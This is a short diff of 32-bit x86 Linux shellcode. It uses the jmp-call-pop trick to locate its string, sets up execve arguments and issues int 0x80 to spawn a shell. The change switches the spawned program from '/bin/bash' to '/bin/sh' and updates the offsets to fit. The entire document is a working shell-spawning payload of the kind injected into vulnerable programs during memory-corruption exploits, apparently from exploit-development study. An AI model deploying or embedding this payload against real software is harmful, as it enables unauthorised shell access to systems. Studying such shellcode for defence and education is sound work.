@@ -18,12 +18,12 @@ _start:
 shellcode:
     pop    esi
     xor    ebx,ebx
-    mov    BYTE [esi+0xb],bl
-    mov    DWORD [esi+0xc],esi
-    mov    DWORD [esi+0x10],ebx
+    mov    BYTE [esi+0x7],bl
+    mov    DWORD [esi+0x8],esi
+    mov    DWORD [esi+0xc],ebx
     lea    ebx,[esi]
-    lea    ecx,[esi+0xc]
-    lea    edx,[esi+0x10]
+    lea    ecx,[esi+0x8]
+    lea    edx,[esi+0xc]
     xor    eax,eax
     mov    al,0xb
     int    0x80
@@ -32,4 +32,4 @@ call_shellcode:
     call   shellcode
 
 message:
-    db    "/bin/bash"
+    db    "/bin/sh"
